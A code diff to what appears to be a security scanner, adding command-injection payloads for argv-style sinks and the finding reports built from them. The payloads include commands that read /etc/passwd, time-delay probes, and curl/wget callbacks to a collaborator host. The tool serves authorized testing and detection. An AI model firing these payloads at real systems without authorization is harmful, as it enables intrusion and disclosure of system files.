@@ -47,6 +47,56 @@ def output_payloads(value: str) -> list:
     ]
 
 
+# ── ARGV-SINK SHAPE: replace the value, do not append to it ──────
+# Every payload above APPENDS to the observed value, which assumes the value lands inside a string a
+# shell will parse. That assumption is wrong for the other common OS-command sink:
+#
+#     Runtime.exec(String)  /  execve(argv)   -- the string is tokenised and run as argv DIRECTLY
+#
+# There is no shell, so `;` `|` `&&` are ordinary argv words and NO metacharacter payload can execute
+# — and appending to the observed value merely adds junk arguments to a command that still runs the
+# app's own program. The shape that works there replaces the value with a bare command, so the value
+# IS the command line.
+#
+# The proof is the command's own output. `uid=0(root) gid=0(root)` is not present in the payload `id`,
+# exactly as the computed product is not present in the echo payloads, so an endpoint that merely
+# reflects the payload still cannot satisfy `analyze_output`. That property is what makes the shape
+# safe to ship, and `tests/test_cmdi_shapes.py` asserts it for every payload.
+#
+# Read-only commands only: this proves execution, it never changes state.
+_ARGV_CMDS = ["id", "cat /etc/passwd"]
+
+
+def argv_payloads(value: str = "") -> list:
+    """Bare commands for an ARGV sink. `value` is accepted and deliberately UNUSED — the shape is
+    defined by replacing it, and taking the argument keeps the call sites symmetrical with
+    `output_payloads(value)` so neither is mistaken for the other."""
+    return [{"payload": c, "shape": "argv"} for c in _ARGV_CMDS]
+
+
+def argv_time_payloads(seconds: int) -> list:
+    """Blind/time-based for an argv sink: the delay IS the whole command.
+
+    The control is the same command with the delay removed, so a confirmation requires a differential
+    the trigger itself caused — an endpoint that is simply slow for every input produces
+    control ~= probe and `analyze_time` declines it."""
+    s = max(1, int(seconds))
+    return [
+        {"payload": f"sleep {s}", "control": "sleep 0", "shape": "argv"},
+        {"payload": f"ping -c {s + 1} 127.0.0.1", "control": "ping -c 1 127.0.0.1", "shape": "argv"},
+    ]
+
+
+def argv_oob_payloads(collab_url: str) -> list:
+    """Out-of-band for an argv sink: the fetch IS the whole command, no separator.
+
+    A callback that never arrives is a NON-DETECTION. Nothing here may be reported on a timeout."""
+    u = (collab_url or "").strip()
+    if not u:
+        return []
+    return [f"curl -s {u}", f"wget -q -O- {u}"]
+
+
 def read_file_payloads(value: str, path: str) -> list:
     """Payloads that READ a specific disclosed file through the injection point. Pure.
 
@@ -131,6 +181,49 @@ def output_finding(url: str, param: str, payload: str, hit: dict) -> dict:
                  [f"Set '{param}' to {payload!r}",
                   f"Observe the executed-command output ({hit['match']}) in the response",
                   "Escalate to a reverse shell only under explicit authorization"])
+
+
+def argv_output_finding(url: str, param: str, payload: str, hit: dict) -> dict:
+    f = _base(url, param, "argv", "critical",
+              (f"Setting '{param}' to the bare command {payload!r} — replacing the value rather than "
+               f"appending to it — returned that command's own output ({hit['kind']}: {hit['match']}). "
+               "The value is passed to the process launcher as the command line itself, so it is run "
+               "as argv with no shell involved; that is why separator payloads produce nothing here."),
+              f"{hit['kind']}: {hit['match']}",
+              [f"Set '{param}' to {payload!r} (replace the whole value)",
+               f"Observe the executed-command output ({hit['match']}) in the response",
+               "Escalate to a reverse shell only under explicit authorization"])
+    f["tags"] = ["cmdi", "rce", "argv", "argv-sink"]
+    return f
+
+
+def argv_time_finding(url: str, param: str, item: dict, control_elapsed: float,
+                      sleep_elapsed: float, seconds: int) -> dict:
+    f = _base(url, param, "argv-time-blind", "critical",
+              (f"For '{param}', the bare command {item['payload']!r} delayed the response to "
+               f"{sleep_elapsed:.1f}s against {control_elapsed:.1f}s for {item['control']!r} — the same "
+               f"command with the delay removed. Nothing is reflected, so this is blind command "
+               f"execution through an argv sink, proven by the trigger-removed differential."),
+              f"{sleep_elapsed:.1f}s vs control {control_elapsed:.1f}s (injected {seconds}s)",
+              [f"Set '{param}' to {item['payload']!r}",
+               f"Observe the response takes ~{seconds}s longer than {item['control']!r}",
+               "Confirm with an OOB payload or an output-based command"])
+    f["tags"] = ["cmdi", "rce", "argv", "blind", "time"]
+    return f
+
+
+def argv_oob_finding(url: str, param: str, probe: str, interactions: list) -> dict:
+    src = (interactions[0] if interactions else {}).get("source_ip", "?")
+    f = _base(url, param, "argv-oob", "critical",
+              (f"Setting '{param}' to the bare command {probe!r} triggered a server-side request from "
+               f"{src}. Nothing was reflected, so this is blind command execution through an argv "
+               "sink, proven by the callback."),
+              f"OOB interaction from {src} on {probe}",
+              [f"Set '{param}' to a bare curl/wget of {probe}",
+               f"Observe the inbound interaction at the collaborator from {src}",
+               "Escalate to full command execution only under explicit authorization"])
+    f["tags"] = ["cmdi", "rce", "argv", "blind", "oob"]
+    return f
 
 
 def time_finding(url: str, param: str, item: dict, control_elapsed: float, sleep_elapsed: float, seconds: int) -> dict:
